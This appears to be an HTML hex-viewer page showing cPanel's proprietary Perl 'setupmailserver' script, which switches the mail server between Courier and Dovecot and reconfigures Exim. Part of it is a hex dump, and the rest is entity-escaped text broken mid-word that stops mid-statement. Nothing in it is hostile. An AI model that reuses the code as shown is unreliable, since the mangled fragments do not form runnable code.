63 6F 6E 66 69 67 28 20 5C 25 6F 72 69 67 5F 75 <br>70 64 61 74 65 63 6F 6E 66 20 29 3B 0A 7D 0A 0A 73 75 62 20 65 6E 61 62 <br>6C 65 5F 63 6F 75 72 69 65 72 20 7B 0A 20 20 20 20 70 72 69 6E 74 20 22 <br>5C 6E 43 68 65 63 6B 69 6E 67 20 74 68 61 74 20 43 6F 75 72 69 65 72 20 <br>69 73 20 75 70 20 74 6F 20 64 61 74 65 5C 6E 22 3B 0A 20 20 20 20 6D 79 <br>20 24 75 70 64 61 74 65 63 6F 6E 66 20 20 20 20 20 20 3D 20 43 70 61 6E <br>65 6C 3A 3A 55 70 64 61 74 65 3A 3A 6C 6F 61 64 75 70 64 61 74 65 63 6F <br>6E 66 69 67 28 29 3B 0A 20 20 20 20 6D 79 20 25 6F 72 69 67 5F 75 70 64 <br>61 74 65 63 6F 6E 66 20 3D 20 25 7B 24 75 70 64 61 74 65 63 6F 6E 66 7D <br>3B 0A 20 20 20 20 24 75 70 64 61 74 65 63 6F 6E 66 2D 3E 7B 27 43 4F 55 <br>52 49 45 52 55 50 27 7D 20 3D 20 27 64 61 69 6C 79 27 3B 0A 20 20 20 20 <br>24 75 70 64 61 74 65 63 6F 6E 66 2D 3E 7B 27 44 4F 56 45 43 4F 54 55 50 <br>27 7D 20 3D 20 27 6E 65 76 65 72 27 3B 0A 20 20 20 20 24 75 70 64 61 74 <br>65 63 6F 6E 66 2D 3E 7B 27 53 59 53 55 50 27 7D 20 20 20 20 20 3D 20 27 <br>64 61 69 6C 79 27 3B 0A 20 20 20 20 43 70 61 6E 65 6C 3A 3A 55 70 64 61 <br>74 65 3A 3A 73 61 76 65 75 70 64 61 74 65 63 6F 6E 66 69 67 28 24 75 70 <br>64 61 74 65 63 6F 6E 66 29 3B 0A 20 20 20 20 6D 79 20 40 63 6F 75 72 69 <br>65 72 75 70 20 3D 20 28 27 2F 73 63 72 69 70 74 73 2F 63 6F 75 72 69 65 <br>72 75 70 27 29 3B 0A 20 20 20 20 70 75 73 68 20 40 63 6F 75 72 69 65 72 <br>75 70 2C 20 27 2D 2D 66 6F 72 63 65 27 20 69 66 20 28 24 66 6F 72 63 65 <br>29 3B 0A 20 20 20 20 73 79 73 74 65 6D 28 40 63 6F 75 72 69 65 72 75 70 <br>29 3B 0A 0A 20 20 20 20 75 6E 6C 65 73 73 20 28 20 24 73 6B 69 70 5F 6D <br>61 69 6C 64 69 72 5F 63 6F 6E 76 65 72 73 69 6F 6E 20 7C 7C 20 28 20 21 <br>24 66 6F 72 63 65 20 26 26 20 24 6C 61 73 74 5F 61 63 74 69 76 65 5F 6D <br>61 69 6C 73 65 72 76 65 72 20 65 71 20 27 63 6F 75 72 69 65 72 27 20 29 <br>20 29 20 7B 0A 20 20 20 20 20 20 20 20 70 72 69 6E 74 20 22 5C 6E 43 6F <br>6E 76 65 72 74 69 6E 67 20 75 73 65 72 20 6D 61 69 6C 64 69 72 73 20 74 <br>6F 20 43 6F 75 72 69 65 72 20 66 6F 72 6D 61 74 2E 2E 2E 5C 6E 22 3B 0A <br>20 20 20 20 20 20 20 20 73 79 73 74 65 6D 28 27 2F 73 63 72 69 70 74 73 <br>2F 6D 61 69 6C 64 69 72 5F 63 6F 6E 76 65 72 74 65 72 20 2D 2D 66 6F 72 <br>72 65 61 6C 20 2D 2D 6F 76 65 72 77 72 69 74 65 20 2D 2D 74 6F 2D 63 6F <br>75 72 69 65 72 27 29 3B 0A 20 20 20 20 20 20 20 20 24 65 72 72 6F 72 5F <br>63 6F 75 6E 74 2B 2B 20 69 66 20 28 24 3F 29 3B 0A 20 20 20 20 7D 0A 20 <br>20 20 20 69 66 20 28 20 24 64 69 73 74 72 6F 20 65 71 20 27 66 72 65 65 <br>62 73 64 27 20 29 20 7B 0A 20 20 20 20 20 20 20 20 70 72 69 6E 74 20 22 <br>5C 6E 45 6E 61 62 6C 69 6E 67 20 63 6F 75 72 69 65 72 2D 61 75 74 68 64 <br>61 65 6D 6F 6E 64 20 69 6E 20 69 6E 69 74 20 73 79 73 74 65 6D 5C 6E 22 <br>3B 0A 20 20 20 20 20 20 20 20 6D 79 20 24 6F 75 74 70 75 74 20 3D 20 24 <br>69 6E 69 74 2D 3E 72 75 6E 5F 63 6F 6D 6D 61 6E 64 5F 66 6F 72 5F 6F 6E <br>65 28 20 27 65 6E 61 62 6C 65 27 2C 20 27 63 6F 75 72 69 65 72 2D 61 75 <br>74 68 64 61 65 6D 6F 6E 64 27 20 29 3B 0A 0A 20 20 20 20 20 20 20 20 23 <br>20 52 65 62 75 69 6C 64 69 6E 67 20 74 68 65 20 63 6F 6E 66 69 67 20 66 <br>69 6C 65 20 6F 6E 20 46 72 65 65 42 53 44 20 77 69 6C 6C 20 75 70 64 61 <br>74 65 20 74 68 65 20 72 63 2E 63 6F 6E 66 20 73 65 74 74 69 6E 67 73 0A <br>20 20 20 20 20 20 20 20 70 72 69 6E 74 20 22 5C 6E 52 65 63 6F 6E 66 69 <br>67 75 72 69 6E 67 20 6F 74 68 65 72 20 43 6F 75 72 69 65 72 20 73 65 72 <br>76 69 63 65 73 5C 6E 22 3B 0A 20 20 20 20 20 20 20 20 73 79 73 74 65 6D <br>28 20 27 2F 73 63 72 69 70 74 73 2F 63 6F 75 72 69 65 72 75 70 27 2C 20 <br>27 2D 2D 72 65 63 6F 6E 66 69 67 27 20 29 3B 0A 0A 20 20 20 20 20 20 20 <br>20 70 72 69 6E 74 20 22 5C 6E 52 65 73 74 61 72 74 69 6E 67 20 43 6F 75 <br>72 69 65 72 5C 6E 22 3B 0A 20 20 20 20 20 20 20 20 73 79 73 74 65 6D 28 <br>27 2F 73 63 72 69 70 74 73 2F 72 65 73 74 61 72 74 73 72 76 5F 69 6D 61 <br>70 27 29 3B 0A 20 20 20 20 7D 0A 20 20 20 20 65 6C 73 65 20 7B 0A 20 20 <br>20 20 20 20 20 20 66 6F 72 65 61 63 68 20 6D 79 20 24 73 65 72 76 69 63 <br>65 20 28 71 77 28 63 6F 75 72 69 65 72 2D 61 75 74 68 6C 69 62 20 20 63 <br>6F 75 72 69 65 72 2D 69 6D 61 70 29 29 20 7B 0A 20 20 20 20 20 20 20 20 <br>20 20 20 20 70 72 69 6E 74 20 22 5C 6E 45 6E 61 62 6C 69 6E 67 20 24 73 <br>65 72 76 69 63 65 20 69 6E 20 69 6E 69 74 20 73 79 73 74 65 6D 5C 6E 22 <br>3B 0A 20 20 20 20 20 20 20 20 20 20 20 20 6D 79 20 24 6F 75 74 70 75 74 <br>20 3D 20 24 69 6E 69 74 2D 3E 72 75 6E 5F 63 6F 6D 6D 61 6E 64 5F 66 6F <br>72 5F 6F 6E 65 28 20 27 65 6E 61 62 6C 65 27 2C 20 24 73 65 72 76 69 63 <br>65 20 29 3B 0A 20 20 20 20 20 20 20 20 20 20 20 20 70 72 69 6E 74 20 22 <br>5C 6E 53 74 61 72 74 69 6E 67 20 24 73 65 72 76 69 63 65 5C 6E 22 3B 0A <br>20 20 20 20 20 20 20 20 20 20 20 20 24 6F 75 74 70 75 74 20 3D 20 24 69 <br>6E 69 74 2D 3E 72 75 6E 5F 63 6F 6D 6D 61 6E 64 28 20 24 73 65 72 76 69 <br>63 65 2C 20 27 73 74 61 72 74 27 20 29 3B 0A 20 20 20 20 20 20 20 20 7D <br>0A 20 20 20 20 7D 0A 20 20 20 20 70 72 69 6E 74 20 22 5C 6E 45 6E 61 62 <br>6C 69 6E 67 20 43 6F 75 72 69 65 72 20 75 70 64 61 74 65 73 5C 6E 22 3B <br>0A 20 20 20 20 24 6F 72 69 67 5F 75 70 64 61 74 65 63 6F 6E 66 7B 27 43 <br>4F 55 52 49 45 52 55 50 27 7D 20 3D 20 27 69 6E 68 65 72 69 74 27 3B 0A <br>20 20 20 20 24 6F 72 69 67 5F 75 70 64 61 74 65 63 6F 6E 66 7B 27 44 4F <br>56 45 43 4F 54 55 50 27 7D 20 3D 20 27 6E 65 76 65 72 27 3B 0A 20 20 20 <br>20 43 70 61 6E 65 6C 3A 3A 55 70 64 61 74 65 3A 3A 73 61 76 65 75 70 64 <br>61 74 65 63 6F 6E 66 69 67 28 24 75 70 64 61 74 65 63 6F 6E 66 29 3B 0A <br>7D 0A 0A 23 20 42 6F 74 68 20 44 6F 76 65 63 6F 74 20 61 6E 64 20 43 6F <br>75 72 69 65 72 20 61 72 65 20 6D 6F 6E 69 74 6F 72 65 64 20 62 79 20 63 <br>68 6B 73 72 76 64 20 75 73 69 6E 67 20 72 65 73 74 61 72 74 73 72 76 5F <br>69 6D 61 70 0A 73 75 62 20 65 6E 61 62 6C 65 5F 63 68 6B 73 72 76 64 5F <br>6D 6F 6E 69 74 6F 72 69 6E 67 20 7B 0A 20 20 20 20 6D 79 20 25 6D 6F 6E <br>69 74 6F 72 65 64 5F 73 65 72 76 69 63 65 73 20 3D 20 43 70 61 6E 65 6C <br>3A 3A 43 68 6B 73 65 72 76 64 3A 3A 67 65 74 6D 6F 6E 69 74 6F 72 65 64 <br>28 29 3B 0A 20 20 20 20 69 66 20 28 20 24 6D 6F 6E 69 74 6F 72 65 64 5F <br>73 65 72 76 69 63 65 73 7B 27 69 6D 61 70 27 7D 20 29 20 7B 0A 20 20 20 <br>20 20 20 20 20 70 72 69 6E 74 20 22 5C 6E 43 68 6B 73 72 76 64 20 6D 6F <br>6E 69 74 6F 72 69 6E 67 20 69 73 20 65 6E 61 62 6C 65 64 5C 6E 22 3B 0A <br>20 20 20 20 7D 0A 20 20 20 20 65 6C 73 65 20 7B 0A 20 20 20 20 20 20 20 <br>20 70 72 69 6E 74 20 22 5C 6E 45 6E 61 62 6C 69 6E 67 20 63 68 6B 73 72 <br>76 64 20 6D 6F 6E 69 74 6F 72 69 6E 67 5C 6E 22 3B 0A 20 20 20 20 20 20 <br>20 20 43 70 61 6E 65 6C 3A 3A 43 68 6B 73 65 72 76 64 3A 3A 65 6E 61 62 <br>6C 65 28 27 69 6D 61 70 27 29 3B 0A 20 20 20 20 20 20 20 20 73 79 73 74 <br>65 6D 28 27 2F 73 63 72 69 70 74 73 2F 72 65 73 74 61 72 74 73 72 76 5F <br>63 68 6B 73 72 76 64 27 29 3B 0A 20 20 20 20 7D 0A 7D 0A 0A 73 75 62 20 <br>72 65 63 6F 6E 66 69 67 75 72 65 5F 65 78 69 6D 20 7B 0A 20 20 20 20 70 <br>72 69 6E 74 20 22 5C 6E 52 65 63 6F 6E 66 69 67 75 72 69 6E 67 20 45 58 <br>49 4D 20 66 6F 72 20 6E 65 77 20 6D 61 69 6C 73 65 72 76 65 72 5C 6E 22 <br>3B 0A 20 20 20 20 6D 79 20 24 6F 75 74 70 75 74 20 3D 20 43 70 61 6E 65 <br>6C 3A 3A 53 61 66 65 52 75 6E 3A 3A 45 72 72 6F 72 73 3A 3A 73 61 66 65 <br>72 75 6E 61 6C 6C 65 72 72 6F 72 73 28 27 2F 73 63 72 69 70 74 73 2F 62 <br>75 69 6C 64 65 78 69 6D 63 6F 6E 66 27 29 3B 0A 20 20 20 20 69 66 20 28 <br>24 3F 29 20 7B 0A 20 20 20 20 20 20 20 20 24 65 72 72 6F 72 5F 63 6F 75 <br>6E 74 2B 2B 3B 0A 20 20 20 20 20 20 20 20 70 72 69 6E 74 20 24 6F 75 74 <br>70 75 74 3B 0A 20 20 20 20 20 20 20 20 70 72 69 6E 74 20 22 5C 6E 57 41 <br>52 4E 49 4E 47 3A 20 45 58 49 4D 20 77 69 6C 6C 20 6E 6F 74 20 62 65 20 <br>72 65 73 74 61 72 74 65 64 21 5C 6E 22 3B 0A 20 20 20 20 7D 0A 20 20 20 <br>20 65 6C 73 65 20 7B 0A 20 20 20 20 20 20 20 20 70 72 69 6E 74 20 22 5C <br>6E 52 65 73 74 61 72 74 69 6E 67 20 45 58 49 4D 5C 6E 22 3B 0A 20 20 20 <br>20 20 20 20 20 73 79 73 74 65 6D 28 27 2F 73 63 72 69 70 74 73 2F 72 65 <br>73 74 61 72 74 73 72 76 5F 65 78 69 6D 27 29 3B 0A 20 20 20 20 7D 0A 7D <br>0A 0A 73 75 62 20 75 73 61 67 65 20 7B 0A 20 20 20 20 70 72 69 6E 74 20 <br>22 55 73 61 67 65 3A 20 73 65 74 75 70 6D 61 69 6C 73 65 72 76 65 72 20 <br>5B 6F 70 74 69 6F 6E 73 5D 20 3C 6D 61 69 6C 73 65 72 76 65 72 3E 5C 6E <br>5C 6E 22 3B 0A 20 20 20 20 70 72 69 6E 74 20 22 4F 70 74 69 6F 6E 73 3A <br>5C 6E 22 3B 0A 20 20 20 20 70 72 69 6E 74 20 22 20 20 2D 2D 66 6F 72 63 <br>65 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 50 65 72 <br>66 6F 72 6D 20 63 6F 6E 76 65 72 73 69 6F 6E 20 65 76 65 6E 20 69 66 20 <br>73 65 72 76 65 72 20 69 73 20 61 6C 72 65 61 64 79 20 63 6F 6E 66 69 67 <br>75 72 65 64 5C 6E 22 3B 0A 20 20 20 20 70 72 69 6E 74 20 22 20 20 2D 2D <br>63 75 72 72 65 6E 74 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 <br>20 44 69 73 70 6C 61 79 20 74 68 65 20 63 75 72 72 65 6E 74 6C 79 20 63 <br>6F 6E 66 69 67 75 72 65 64 20 6D 61 69 6C 20 73 65 72 76 65 72 5C 6E 22 <br>3B 0A 20 20 20 20 70 72 69 6E 74 20 22 20 20 2D 2D 73 6B 69 70 2D 6D 61 <br>69 6C 64 69 72 2D 63 6F 6E 76 65 72 73 69 6F 6E 20 20 44 6F 6E 27 74 20 <br>63 6F 6E 76 65 72 74 20 75 73 65 72 20 6D 61 69 6C 64 69 72 73 20 64 75 <br>72 69 6E 67 20 74 68 65 20 73 65 72 76 65 72 20 63 6F 6E 76 65 72 73 69 <br>6F 6E 5C 6E 22 3B 0A 20 20 20 20 70 72 69 6E 74 20 22 5C 6E 22 3B 0A 20 <br>20 20 20 70 72 69 6E 74 20 22 4D 61 69 6C 53 65 72 76 65 72 73 3A 5C 6E <br>22 3B 0A 20 20 20 20 70 72 69 6E 74 20 22 20 20 63 6F 75 72 69 65 72 20 <br>20 20 20 53 74 61 6E 64 61 72 64 20 6D 61 69 6C 20 73 65 72 76 65 72 20 <br>6F 6E 20 63 50 61 6E 65 6C 20 73 79 73 74 65 6D 73 5C 6E 22 3B 0A 20 20 <br>20 20 70 72 69 6E 74 20 22 20 20 64 6F 76 65 63 6F 74 20 20 20 20 4C 6F <br>77 65 72 20 6D 65 6D 6F 72 79 20 75 73 61 67 65 20 6D 61 69 6C 20 73 65 <br>72 76 65 72 5C 6E 22 3B 0A 20 20 20 20 70 72 69 6E 74 20 22 20 20 64 69 <br>73 61 62 6C 65 64 20 20 20 44 69 73 61 62 6C 65 20 6C 6F 63 61 6C 20 50 <br>4F 50 33 20 61 6E 64 20 49 4D 41 50 20 66 75 6E 63 74 69 6F 6E 61 6C 69 <br>74 79 5C 6E 22 3B 0A 20 20 20 20 70 72 69 6E 74 20 22 5C 6E 22 3B 0A 0A <br>20 20 20 20 65 78 69 74 20 30 3B 0A 7D 0A </td><td bgcolor=000000>#!/usr/bin/perl&nbsp;#&nbsp;cpanel<br>&nbsp;-&nbsp;setupmailserver&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Copyri<br>ght(c)&nbsp;2010&nbsp;cPanel,&nbsp;Inc.<br>&nbsp;#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;All&nbsp;rights&nbsp;<br>Reserved.&nbsp;#&nbsp;copyright@cp<br>anel.net&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;http://cpanel.net&nbsp;#&nbsp;Thi<br>s&nbsp;code&nbsp;is&nbsp;subject&nbsp;to&nbsp;the<br>&nbsp;cPanel&nbsp;license.&nbsp;Unautho<br>rized&nbsp;copying&nbsp;is&nbsp;prohibi<br>ted&nbsp;&nbsp;BEGIN&nbsp;{&nbsp;unshift&nbsp;@IN<br>C,&nbsp;'/usr/local/cpanel';&nbsp;<br>}&nbsp;&nbsp;use&nbsp;strict;&nbsp;use&nbsp;Cpane<br>l::Config&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;();&nbsp;u<br>se&nbsp;Cpanel::Chkservd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;();&nbsp;use&nbsp;Cpanel::Sys::<br>OS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;();&nbsp;use&nbsp;Cpane<br>l::Services&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;();&nbsp;u<br>se&nbsp;Cpanel::SafeRun::Erro<br>rs&nbsp;();&nbsp;use&nbsp;Cpanel::SSLCe<br>rts&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;();&nbsp;use&nbsp;Cpane<br>l::Usage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;();&nbsp;u<br>se&nbsp;Cpanel::PID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;();&nbsp;use&nbsp;Cpanel::Init&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;();&nbsp;use&nbsp;Cpane<br>l::Update&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;();&nbsp;&nbsp;<br>my&nbsp;$help&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;0;&nbsp;my&nbsp;$man&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;0;&nbsp;my&nbsp;$fo<br>rce&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;<br>0;&nbsp;my&nbsp;$current&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;0;&nbsp;my&nbsp;$skip_mai<br>ldir_conversion&nbsp;=&nbsp;0;&nbsp;$|&nbsp;<br>=&nbsp;1;&nbsp;&nbsp;delete&nbsp;$ENV{'cp_se<br>curity_token'};&nbsp;delete&nbsp;$<br>ENV{'HTTP_REFERER'};&nbsp;&nbsp;#&nbsp;<br>Argument&nbsp;processing&nbsp;my&nbsp;%<br>opts&nbsp;=&nbsp;(&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'force'&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt;&nbsp;\\$forc<br>e,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'current'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt;&nbsp;\\$current,&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;'skip-maildir-convers<br>ion'&nbsp;=&gt;&nbsp;\\$skip_maildir_c<br>onversion,&nbsp;);&nbsp;&nbsp;Cpanel::U<br>sage::wrap_options(&nbsp;\\@AR<br>GV,&nbsp;\\&amp;usage,&nbsp;\\%opts&nbsp;);&nbsp;&nbsp;<br>@ARGV&nbsp;=&nbsp;(&nbsp;grep(&nbsp;!/^--/,&nbsp;<br>@ARGV&nbsp;)&nbsp;);&nbsp;&nbsp;my&nbsp;$selected<br>_mailserver&nbsp;=&nbsp;shift;&nbsp;usa<br>ge()&nbsp;unless&nbsp;(&nbsp;$selected_<br>mailserver&nbsp;||&nbsp;$current&nbsp;)<br>;&nbsp;&nbsp;my&nbsp;$cpconf_ref&nbsp;=&nbsp;Cpan<br>el::Config::loadcpconf()<br>;&nbsp;my&nbsp;$storage_type&nbsp;=&nbsp;$cp<br>conf_ref-&gt;{'maildir'}&nbsp;?&nbsp;<br>'maildir'&nbsp;:&nbsp;'mbox';&nbsp;$cpc<br>onf_ref-&gt;{'mailserver'}&nbsp;<br>=&nbsp;$storage_type&nbsp;eq&nbsp;'mbox<br>'&nbsp;?&nbsp;'cppop'&nbsp;:&nbsp;defined&nbsp;$c<br>pconf_ref-&gt;{'mailserver'<br>}&nbsp;?&nbsp;$cpconf_ref-&gt;{'mails<br>erver'}&nbsp;:&nbsp;'courier';&nbsp;my&nbsp;<br>$last_active_mailserver&nbsp;<br>=&nbsp;$cpconf_ref-&gt;{'mailser<br>ver'};&nbsp;my&nbsp;$current_mails<br>erver&nbsp;=&nbsp;Cpanel::Services<br>::is_enabled('mail')&nbsp;?&nbsp;$<br>cpconf_ref-&gt;{'mailserver<br>'}&nbsp;:&nbsp;'disabled';&nbsp;&nbsp;if&nbsp;($c<br>urrent)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;Cur<br>rent&nbsp;mailserver&nbsp;type:&nbsp;${<br>current_mailserver}\\n&quot;;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;Current&nbsp;stora<br>ge&nbsp;format:&nbsp;${storage_typ<br>e}\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit&nbsp;0;&nbsp;}&nbsp;&nbsp;if<br>&nbsp;(&nbsp;$storage_type&nbsp;eq&nbsp;'mbo<br>x'&nbsp;)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;$selecte<br>d_mailserver&nbsp;eq&nbsp;'cppop'&nbsp;<br>)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;Alrea<br>dy&nbsp;configured.\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;prin<br>t&nbsp;&quot;Before&nbsp;selecting&nbsp;a&nbsp;ne<br>w&nbsp;mail&nbsp;server&nbsp;you&nbsp;must&nbsp;f<br>irst&nbsp;convert\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;print&nbsp;&quot;to&nbsp;the&nbsp;maildir&nbsp;s<br>torage&nbsp;format&nbsp;using&nbsp;/scr<br>ipts/convert2maildir\\n&quot;;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit&nbsp;0;&nbsp;}&nbsp;&nbsp;if<br>&nbsp;(&nbsp;!$force&nbsp;&amp;&amp;&nbsp;$current_m<br>ailserver&nbsp;eq&nbsp;$selected_m<br>ailserver&nbsp;)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;<br>&quot;Already&nbsp;configured.\\n&quot;;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit&nbsp;0;&nbsp;}&nbsp;&nbsp;unless&nbsp;(<br>&nbsp;$selected_mailserver&nbsp;eq<br>&nbsp;'dovecot'&nbsp;||&nbsp;$selected_<br>mailserver&nbsp;eq&nbsp;'courier'&nbsp;<br>||&nbsp;$selected_mailserver&nbsp;<br>eq&nbsp;'disabled'&nbsp;)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pr<br>int&nbsp;&quot;Unknown&nbsp;mailserver&nbsp;<br>type&nbsp;specified.\\nTry&nbsp;$0&nbsp;<br>--help\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit&nbsp;1;&nbsp;}<br>&nbsp;&nbsp;if&nbsp;(&nbsp;$&gt;&nbsp;!=&nbsp;0&nbsp;)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d<br>ie&nbsp;&quot;Conversion&nbsp;process&nbsp;m<br>ust&nbsp;be&nbsp;performed&nbsp;as&nbsp;root<br>&quot;;&nbsp;}&nbsp;&nbsp;my&nbsp;$pid_obj&nbsp;=&nbsp;Cpan<br>el::PID-&gt;new(&nbsp;{&nbsp;'pid_fil<br>e'&nbsp;=&gt;&nbsp;'/var/run/setupmai<br>lserver.pid'&nbsp;}&nbsp;);&nbsp;unless<br>&nbsp;(&nbsp;$pid_obj-&gt;create_pid_<br>file()&nbsp;&gt;&nbsp;0&nbsp;)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print<br>&nbsp;&quot;Setupmailserver&nbsp;appear<br>s&nbsp;to&nbsp;be&nbsp;running&nbsp;already.<br>\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;Please&nbsp;w<br>ait&nbsp;for&nbsp;the&nbsp;conversion&nbsp;t<br>o&nbsp;finish&nbsp;before&nbsp;attempti<br>ng&nbsp;another.\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit<br>&nbsp;1;&nbsp;}&nbsp;&nbsp;$cpconf_ref-&gt;{'ma<br>ilserver'}&nbsp;=&nbsp;$selected_m<br>ailserver&nbsp;if&nbsp;(&nbsp;$selected<br>_mailserver&nbsp;ne&nbsp;'disabled<br>'&nbsp;);&nbsp;Cpanel::Config::sav<br>ecpconf($cpconf_ref);&nbsp;my<br>&nbsp;$distro&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;Cpanel::<br>Sys::OS::getos();&nbsp;my&nbsp;$in<br>it&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;Cpanel::Init<br>-&gt;new();&nbsp;my&nbsp;$error_count<br>&nbsp;=&nbsp;0;&nbsp;&nbsp;#branch&nbsp;to&nbsp;uninsa<br>ll/install&nbsp;functions&nbsp;dis<br>able_chksrvd_monitoring(<br>);&nbsp;&nbsp;if&nbsp;(&nbsp;$selected_mails<br>erver&nbsp;eq&nbsp;'courier'&nbsp;)&nbsp;{&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;disable_none();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d<br>isable_dovecot();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;en<br>able_courier();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;enab<br>le_chksrvd_monitoring();<br>&nbsp;}&nbsp;elsif&nbsp;(&nbsp;$selected_mai<br>lserver&nbsp;eq&nbsp;'dovecot'&nbsp;)&nbsp;{<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;disable_none();&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;disable_courier();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>enable_dovecot();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;en<br>able_chksrvd_monitoring(<br>);&nbsp;}&nbsp;else&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;enable_n<br>one();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;disable_dovec<br>ot();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;disable_courie<br>r();&nbsp;}&nbsp;&nbsp;reconfigure_exim<br>();&nbsp;run_fastmail();&nbsp;$pid<br>_obj-&gt;remove_pid_file();<br>&nbsp;if&nbsp;($error_count)&nbsp;